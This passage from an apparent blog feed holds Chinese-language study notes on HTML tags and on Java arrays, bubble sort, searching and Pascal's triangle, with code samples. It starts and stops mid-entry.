class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> ==&gt; 分成若干个段落,会自适应浏览器宽度换行</span><br><span class="line">        换行: <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  ==&gt; 强制换行</span><br><span class="line">        </span><br><span class="line">    2.3 文本格式化标签:</span><br><span class="line">        2.3.1 加粗 : <span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span> <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>  (记住)</span><br><span class="line">        2.3.2 倾斜 : <span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span> <span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>  (记住)</span><br><span class="line">        2.3.3 删除线: <span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span> <span class="tag">&lt;<span class="name">s</span>&gt;</span><span class="tag">&lt;/<span class="name">s</span>&gt;</span></span><br><span class="line">        2.3.4 下划线: <span class="tag">&lt;<span class="name">ins</span>&gt;</span><span class="tag">&lt;/<span class="name">ins</span>&gt;</span> <span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3.盒子标签 --&gt;</span></span><br><span class="line">    3.1.div和span</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>和<span class="tag">&lt;<span class="name">span</span>&gt;</span>是没有语义的，它们就是一个盒子，用来装内容的。</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span> 这是盒子 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span> 今日价格 <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        div是 division的缩写，表示分割、分区。有默认宽高，默认占据一行。</span><br><span class="line">        span 意为跨度、跨距   ==&gt;  小盒子,与内容同行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 4.图像标签 --&gt;</span></span><br><span class="line">    4.1 标签:<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;文件路径&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    4.2 属性:</span><br><span class="line">            属性        属性值   说明</span><br><span class="line">            src       图片路径   必须属性</span><br><span class="line">            alt         文本    替换文本。图像不能显示的文字</span><br><span class="line">            title       文本    提示文本。鼠标放到图像上，显示的文字</span><br><span class="line">            width       像素    设置图像的宽度</span><br><span class="line">            height      像素    设置图像的高度</span><br><span class="line">            border      像素    设置图像的边框粗细</span><br><span class="line">    4.3 注意:</span><br><span class="line">        图像标签可以拥有多个属性，必须写在标签名的后面</span><br><span class="line">        属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开</span><br><span class="line">        属性采取键值对的格式，即key=“value&quot;的格式，属性=“属性值”</span><br><span class="line">    4.4 路径(前期铺垫知识)</span><br><span class="line">        (1)目录文件夹和根目录:</span><br><span class="line">            实际工作中，我们的文件不能随便放，否则用起来很难快速的找到他们，因此我们需要一个文件夹来管理他们。</span><br><span class="line">            目录文件夹:就是普通文件夹，里面只不过存放了我们做页面所需要的相关素材，比如html文件、图片等</span><br><span class="line">            根目录:打开目录文件夹的第一层就是根目录</span><br><span class="line">        (2)打开文件夹</span><br><span class="line">        (3)相对路径/绝对路径</span><br><span class="line">            同一级: </span><br><span class="line">            上一级:../</span><br><span class="line">            下一级:/</span><br><span class="line">            绝对路径:网络/本机路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 5.超链接标签 --&gt;</span></span><br><span class="line">        5.1 语法:<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://###...&quot;</span> <span class="attr">target</span>=<span class="string">&quot;&quot;</span>&gt;</span>文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        5.2 属性:</span><br><span class="line">            属性     作用</span><br><span class="line">            href    用于指定链接目标的url地址，(必须属性)当为标签应用href属性时，它就具有了超链接的功能</span><br><span class="line">            target  用于指定链接页面的打开方式，其中_self为默认值， blank为在新窗口中打开方式</span><br><span class="line">        5.3 链接的形式</span><br><span class="line">            5.3.1 外部链接:跳转到其他外部链接页面  外部url</span><br><span class="line">            5.3.2 内部链接:内部链接跳转 内部文件跳转</span><br><span class="line">            5.3.3 空链接:空连接,href=&#x27;#&#x27;</span><br><span class="line">            5.3.4 下载链接:放文件的url路径直接下载</span><br><span class="line">            5.3.5 网页元素链接:网页各个元素的超链接</span><br><span class="line">        5.4锚点链接</span><br><span class="line">            这是页面内的跳转</span><br><span class="line">            5.4.1 语法:点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#名字&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>跳转到<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;名字&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 6.注释标签与特殊字符: --&gt;</span></span><br><span class="line">        6.1 注释语法:<span class="comment">&lt;!--   --&gt;</span> (快捷键：ctr + /)</span><br><span class="line">        6.2 特殊字符显示</span><br><span class="line">            <span class="symbol">&amp;lt;</span>大于号</span><br><span class="line">            <span class="symbol">&amp;gt;</span>小于号</span><br><span class="line">            <span class="symbol">&amp;nbsp;</span>空格</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在我的理解里，所有的双标签都是容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#名字&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>2<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>3<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题标签<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>标题一共六级选，<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>文字加粗一行显。<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>由大到小依次减，<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>从重到轻随之变。<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>语法规范书写后，<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>具体效果刷新见。<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-10</title>
      <link href="/2023/02/10/java-study-10/"/>
      <url>/2023/02/10/java-study-10/</url>
      
        <content type="html"><![CDATA[<p><strong>数组+排序+查找</strong></p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是一种类型</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><span id="more"></span><p>创建方法分为 <strong>动态初始化</strong> 和 <strong>静态初始化</strong></p><p>1.先定义数组后引用数组( <strong>直接分配</strong> 空间)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//下面是两种写法</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">12</span>,<span class="number">13</span>,<span class="number">11</span>&#125;;</span><br><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">12</span>,<span class="number">13</span>,<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">// 数据类型 数组名[] = &#123;元素1,元素2,元素3...&#125;</span></span><br><span class="line"><span class="comment">//意思是创建一个int类型的数组，元素是12，13，11.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用，和Python的调用如出一辙</span></span><br><span class="line">arr[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 数组的调用和Python一样，同样是下标索引从0开始，到它(长度-1)的地方结束。</span></span><br></pre></td></tr></table></figure><p>2.先声明数组后创建数组(先声明一个名字，后面具体使用再分配空间)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 同样是两种方法</span></span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">49</span>];</span><br><span class="line"><span class="type">int</span> arr[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">49</span>];</span><br><span class="line"><span class="comment">// 数据类型[] 数据名 = new 数据类型[大小/长度]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用的方法一样</span></span><br><span class="line">arr[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>3.补充一种初始化方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str[] = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>&#125;;</span><br><span class="line"><span class="comment">// 这个在编译器上是行得通的</span></span><br></pre></td></tr></table></figure><h2 id="注意事项及细节"><a href="#注意事项及细节" class="headerlink" title="注意事项及细节"></a>注意事项及细节</h2><blockquote><ol><li><p>数组是多个 <strong>相同类型</strong> 的数据的组合，实现堆这些数据的统一管理(自动类型转换可以用)</p></li><li><p>数组中的元素可以是 <strong>基本数据类型</strong> 和 <strong>引用数据类型</strong> ，但 <strong>不能混用</strong> 。</p></li><li><p>数组创建后没有赋值时，默认值有：<br><strong>int 0;short 0,byte 0,long 0,float 0.0,double 0.0,char \u0000,boolean false,String null</strong></p></li><li><p>使用数组的步骤： <strong>声明数组</strong> 并且开辟空间，给数组各个元素 <strong>赋值</strong> ，使用数组</p></li><li><p>数组 <strong>下标0</strong> 开始，数组的 <strong>大小/长度-1</strong> 结束。末位的数组元素下标 <strong>不等于</strong> 数组长度。</p></li><li><p>数组必须在指定范围内使用，否则会爆出 <strong>下标越界异常</strong> (编译为class文件时是不会爆出这个异常的)</p></li><li><p>数组属于 <strong>引用型</strong> ，数组数据类型是对象（object）</p></li></ol></blockquote><h2 id="数组赋值机制"><a href="#数组赋值机制" class="headerlink" title="数组赋值机制"></a>数组赋值机制</h2><blockquote><p>数组默认使用 <strong>引用传递</strong> ，从内存角度来讲，数组的元素放在堆当中，在栈中仅仅只是存储了它的 <strong>地址</strong> 。<br>例如 int arr1[] = {1,2,3} ; int[] arr2 = arr1 表示的是arr2和arr1拷贝了相同的地址，共享了数组，两者改变元素时会同时改变数组的元素。<br>也即是说，两者不能使用变量赋值的那种值传递/值拷贝，只能拷贝 <strong>相同的地址</strong> 操作 <strong>相同的数组</strong> ，这在Python当中也称为浅拷贝。<br>补充：JVM的内存：堆+栈+方法区</p></blockquote><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><p>排序时将多个数据按照 <strong>指定顺序排列</strong> 的过程。</p><h2 id="分类-后面有详细解析"><a href="#分类-后面有详细解析" class="headerlink" title="分类(后面有详细解析)"></a>分类(后面有详细解析)</h2><blockquote><ol><li><strong>内部排序</strong> :指将需要处理的所有数据都加载到内部存储器中进行排序。包括(交换式排序法、选择式排序法和插入式排序法);</li><li><strong>外部排序</strong> :数据量过大，无法全部加载到内存中，需要借助外部存储进行排序。包括(合并排序法和直接合并排序法)。</li></ol></blockquote><h2 id="冒泡排序简述"><a href="#冒泡排序简述" class="headerlink" title="冒泡排序简述"></a>冒泡排序简述</h2><p>两两互相比较，谁大谁向右边移动。(反过来也可以，这是观察出来的。)</p><p>观察结果：<br>    数组大小为5时，<br>        数组第1次交换5-1次 4<br>        数组第2次交换5-2次 3<br>        数组第3次交换5-3次 2<br>        数组第4次交换5-4次 1<br>    整体交换了4次，每次的子交换逐级递减。<br>    每一轮排序确定一个最大数，确定完成后的最大数不参与排序。<br>    每一轮因为减少一个最大数，排序的方式也就逐级递减。</p><h1 id="查找"><a href="#查找" class="headerlink" title="查找()"></a>查找()</h1><blockquote><ol><li>顺序查找<br>按个查找</li><li>二分查找<br>数组必须有序，先看中间数，<br>预加入数值&gt;中间数    向中间数右边查找<br>预加入数值&lt;中间数    向中间数左边查找<br>（算法处讲解）</li></ol></blockquote><h1 id="多维数组-二维数组"><a href="#多维数组-二维数组" class="headerlink" title="多维数组-二维数组"></a>多维数组-二维数组</h1><blockquote><ol><li><strong>概述</strong> :二维数组的每一个元素都是一维数组，所以不能出现除了数组和null外的其他类型.</li><li><strong>使用方式</strong> :<br>下面是所有的初始化方法</li></ol></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.动态初始化(直接创建)</span></span><br><span class="line"><span class="comment">// 类型[][] 数组名 = new 类型[大小][大小];</span></span><br><span class="line"><span class="type">int</span>[][] num = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">12</span>][<span class="number">15</span>];</span><br><span class="line"><span class="comment">// 2.动态初始化(先声明再定义数组名/开辟空间)</span></span><br><span class="line">    <span class="comment">// 1.声明：类型 数组名[][];</span></span><br><span class="line">    <span class="comment">// 2.定义：数组名 = new 类型[大小][大小];</span></span><br><span class="line">    <span class="comment">// 3.赋值</span></span><br><span class="line"><span class="comment">// 3.动态初始化(列数不确定,也称为列数不等二维数组)</span></span><br><span class="line">    <span class="comment">// 1.创建一个二位数组，其中有3个一维数组，且都为null,也就是没有开空间：</span></span><br><span class="line">            <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>][]</span><br><span class="line">    <span class="comment">// 此时，就相当于：</span></span><br><span class="line">            [<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>]</span><br><span class="line">    <span class="comment">// 2.创建一个不定大小的1维数组(固定行，列的大小是不固定的)</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++) &#123;</span><br><span class="line">                <span class="comment">// 这里的i+1是在开辟第二维度的空间大小，说白了，就是第二层的一维数组大小</span></span><br><span class="line">                arr[i] = <span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="comment">// 3.将数组挨个赋值，否则数组的元素全是0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.静态初始化</span></span><br><span class="line">        <span class="comment">// 1.定义 类型 数组名 = &#123;&#123;值1,值2...&#125;,&#123;值1,值2...&#125;,&#123;值1,值2...&#125;&#125;</span></span><br><span class="line">        <span class="comment">// 2.直接访问即可</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="二维数组在内存的存在形式"><a href="#二维数组在内存的存在形式" class="headerlink" title="二维数组在内存的存在形式"></a>二维数组在内存的存在形式</h2><blockquote><p>假设有这么一个数组：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] arr = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;; </span><br></pre></td></tr></table></figure><blockquote><p>内存区域当中，分为三个区域：栈/堆/方法<br>数组先在栈当中新建一个记录，指向堆当中的一个一维数组，但一维数组内的两个值是一个堆地址，指向的是二维的堆地址。</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><blockquote><ol><li>声明方式: </li></ol></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] y[][]/<span class="type">int</span>[] y[]/<span class="type">int</span> y[][](三种方式)</span><br></pre></td></tr></table></figure><blockquote><ol start="2"><li>数组组成：多个一位数组组成，各维度长度可相同可不同</li><li>列数不等二维数组：顾名思义，列数不相等</li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-09</title>
      <link href="/2023/02/09/java-study-09/"/>
      <url>/2023/02/09/java-study-09/</url>
      
        <content type="html"><![CDATA[<h1 id="杨辉三角-（列数不等二维数组）"><a href="#杨辉三角-（列数不等二维数组）" class="headerlink" title="杨辉三角 -（列数不等二维数组）"></a>杨辉三角 -（列数不等二维数组）</h1><h2 id="做法1"><a href="#做法1" class="headerlink" title="做法1"></a>做法1</h2><p><strong>目的</strong> ：打印一个杨辉三角 ?ω?</p><span id="more"></span><p>型如：</p><pre><code>11 11 2 11 3 3 11 4 6 4 1...</code></pre><p>为了更好的发现规律，稍微给这个原始的杨辉三角做点 <strong>处理</strong> ： ●ω●</p><pre><code>  a b c d e f   a 1 0b 1 1 0c 1 2 1 0d 1 3 3 1 0e 1 4 6 4 1 0...</code></pre><p>当你把每一行的首尾都<span style="color:red" > <strong>定死为1和0</strong> </span>，那么会得到一点 <strong>规律</strong> ：&lt;(￣︶￣)&gt;</p><p><span style="color:red" > <strong>变化的部分永远都是中间的那个三角区域</strong> </span></p><p><img src="photo_01.png" alt="&quot;效果分析&quot;"></p><p>也就是说，大概可以得出这样的一个等式 <strong>(在第1列和第一行定死数字且每行最后一个数字定死为0的情况下)</strong></p><p>假设当前的位置为 <strong>(x,y)</strong> ,值为 <strong>n</strong> ，<strong>n=(x-1,y-1)+(x-1,y)</strong> ;</p><p><strong>(x-1,y-1)和(x-1,y)</strong> 都表示一个 <strong>二维坐标</strong> 。</p><p>核心都明白了，接下来直接上代码了. ~(￣▽￣)~*</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YanHui</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="comment">// 杨辉三角</span></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            先确定杨辉三角的高度</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            再观察规律</span></span><br><span class="line"><span class="comment">            第1行 1 0</span></span><br><span class="line"><span class="comment">            第2行 1 1 0</span></span><br><span class="line"><span class="comment">            第3行 1 2 1 0</span></span><br><span class="line"><span class="comment">            第4行 1 3 3 1 0</span></span><br><span class="line"><span class="comment">            观察得出:</span></span><br><span class="line"><span class="comment">            1.每一个数字对应它正上方的数字与左上方数字的加和</span></span><br><span class="line"><span class="comment">            2.每一行的1和0是固定的</span></span><br><span class="line"><span class="comment">            3.每一行的加和对象都是[1,arr.length-2]</span></span><br><span class="line"><span class="comment">                =&gt;也就是说,每一行需要进行运算的对象是[1,arr.length-2]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            实现:</span></span><br><span class="line"><span class="comment">            初始化的数组:</span></span><br><span class="line"><span class="comment">            int[][] arr = new int[4][];</span></span><br><span class="line"><span class="comment">            最初的赋值:</span></span><br><span class="line"><span class="comment">            int arr[0] = &#123;1,0&#125;</span></span><br><span class="line"><span class="comment">            行数为i列数为j的话,</span></span><br><span class="line"><span class="comment">            i,j的初始值都是1,j的结束值是0</span></span><br><span class="line"><span class="comment">            而且,j的大小=前层的大小+1</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="comment">// 具体实现:</span></span><br><span class="line">            <span class="comment">// 获取杨辉三角的高度（灵活的控制杨辉三角的高度）</span></span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">myScanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            <span class="comment">// System.out.print(&quot;请输入杨辉三角的高度:&quot;);</span></span><br><span class="line">            <span class="comment">// int height = myScanner.nextInt();</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">            <span class="comment">// 控制杨辉三角的行宽度</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 定义初始数组</span></span><br><span class="line">            <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[height][];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[width];</span><br><span class="line">            arr[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 这里有个坑，数字0是没有占用长度的……</span></span><br><span class="line">            <span class="comment">// 也就是说，用0计算长度会直接忽略掉0</span></span><br><span class="line">            <span class="comment">// 比如&#123;1,0,0&#125;.length=1;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i &lt;height;i++ ) &#123;</span><br><span class="line">                width++;</span><br><span class="line">                arr[i] = <span class="keyword">new</span> <span class="title class_">int</span>[width];</span><br><span class="line">                arr[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>; j&lt;width-<span class="number">1</span>;j++ ) &#123;</span><br><span class="line">                    arr[i][j] = arr[i-<span class="number">1</span>][j-<span class="number">1</span>]+arr[i-<span class="number">1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;高度为&quot;</span>+height+<span class="string">&quot;的杨辉三角:&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr.length ;i++ ) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;arr[i].length-<span class="number">1</span> ;j++ ) &#123;</span><br><span class="line">                    System.out.print(arr[i][j]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终会实现如下的效果：￣▽￣</p><p><img src="photo_02.png" alt="&quot;最终展示&quot;"></p><p>其实做法有很多种，比如：</p><h2 id="做法2"><a href="#做法2" class="headerlink" title="做法2"></a>做法2</h2><p>1.第一行1个元素，第n行n个元素<br>2.每行首末都是1<br>3.第三行开始，除去第一个元素与最后一个元素外，<br><strong>arr[i][j]=arr[i-1][j]+arr[i-1][j-1]</strong></p><p>这种做法比先前的思路简便些，感觉代码实现也略微简单些。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">YanHui03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 采用另外一种思路的杨辉三角</span></span><br><span class="line">        <span class="comment">// 获取高度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">height</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">        <span class="comment">// 获取宽度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">width</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 创建具有初始行数的数组</span></span><br><span class="line">        <span class="type">int</span>[][] yanghui = <span class="keyword">new</span> <span class="title class_">int</span>[height][];</span><br><span class="line">        <span class="comment">// 操作每行</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; yanghui.length ;i++ ) &#123;</span><br><span class="line">            <span class="comment">// 操作每行行内元素</span></span><br><span class="line">            <span class="comment">// 按每行创建，大小为i+1</span></span><br><span class="line">            yanghui[i] = <span class="keyword">new</span> <span class="title class_">int</span>[i+<span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 行的宽度定义为i+1</span></span><br><span class="line">            width = i+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 内层的循环</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j &lt; width ;j++ ) &#123;</span><br><span class="line">                <span class="comment">// 如果行数不是第0行</span></span><br><span class="line">                <span class="keyword">if</span> (j==<span class="number">0</span>||j==width-<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="comment">// 首末都是1，类似于那种空心棱形的编程思想</span></span><br><span class="line">                    yanghui[i][j] = <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    yanghui[i][j] = yanghui[i-<span class="number">1</span>][j]+yanghui[i-<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;打印高度为&quot;</span>+height+<span class="string">&quot;的杨辉三角所有的元素：&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;yanghui.length ;i++ ) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span>;j&lt;yanghui[i].length ;j++ ) &#123;</span><br><span class="line">                System.out.print(yanghui[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果图和之前那个差不多啦ヽ(ˋ▽ˊ)ノ<br><img src="photo_03.png" alt="&quot;最终展示&quot;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习日志-08</title>
      <link href="/2023/02/08/java-study-08/"/>
      <url>/2023/02/08/java-study-08/</url>
      
        <content type="html"><![CDATA[<h1 id="冒泡排序-简述"><a href="#冒泡排序-简述" class="headerlink" title="冒泡排序(简述)"></a>冒泡排序(简述)</h1><p>老师说，学习不能急躁。学习排序的整体章节在后面有，这儿只是个简单介绍。</p><span id="more"></span><h2 id="排序是什么"><a href="#排序是什么" class="headerlink" title="排序是什么"></a>排序是什么</h2><p>排序是将多个数据，依指定的顺序进行排列的过程。</p><h3 id="排序的分类"><a href="#排序的分类" class="headerlink" title="排序的分类:"></a>排序的分类:</h3><blockquote><p><strong>1.内部排序:</strong></p><p>指将需要处理的所有数据都加载到内部存储器中进行排序。包括(交换式排序法、选择式排序法和插入式排序法);</p><p><strong>2.外部排序法:</strong></p><p>数据量过大，无法全部加载到内存中，需要借助外部存储进行排序。包括(合并排序法和直接合并排序法)。</p></blockquote><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>冒泡排序很简单，给你一个数组，你需要将它以从小到大的顺序排序，这时候就可以使用冒泡排序了。</p><p>目前，为从左到右进行比较，左边大的数字与右边小的数字交换位置，直到无法交换为止。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数组的大小：</span></span><br><span class="line"><span class="type">int</span>[] a = &#123;<span class="number">45</span>,<span class="number">24</span>,<span class="number">69</span>,<span class="number">80</span>,<span class="number">57</span>,<span class="number">13</span>&#125;;</span><br></pre></td></tr></table></figure><p>接下来，对整个排序进行模拟：</p><pre><code>第1次排序    交换第1次 &#123;24,45,69,80,57,13&#125;; =&gt; 24和15进行交换    交换第2次 &#123;24,45,69,80,57,13&#125;; =&gt; 45&lt;69,不交换    交换第3次 &#123;24,45,69,80,57,13&#125;; =&gt; 69&lt;80,不交换    交换第4次 &#123;24,45,69,57,80,13&#125;; =&gt; 80和57进行交换    交换第5次 &#123;24,45,69,57,13,80&#125;; =&gt; 13和80进行交换第2次排序    交换第1次 &#123;24,45,69,57,13,80&#125;;    交换第2次 &#123;24,45,69,57,13,80&#125;;    交换第3次 &#123;24,45,57,69,13,80&#125;;    交换第4次 &#123;24,45,57,13,69,80&#125;;第3次排序    交换第1次 &#123;24,45,57,13,69,80&#125;;    交换第2次 &#123;24,45,57,13,69,80&#125;;    交换第3次 &#123;24,45,13,57,69,80&#125;;第4次排序    交换第1次 &#123;24,45,13,57,69,80&#125;;    交换第2次 &#123;24,13,45,57,69,80&#125;;第5次排序    交换第1次 &#123;13,24,45,57,69,80&#125;;</code></pre><p>相信细心的人已经瞧见规律了，下面就简单的总结下：</p><pre><code>规律1 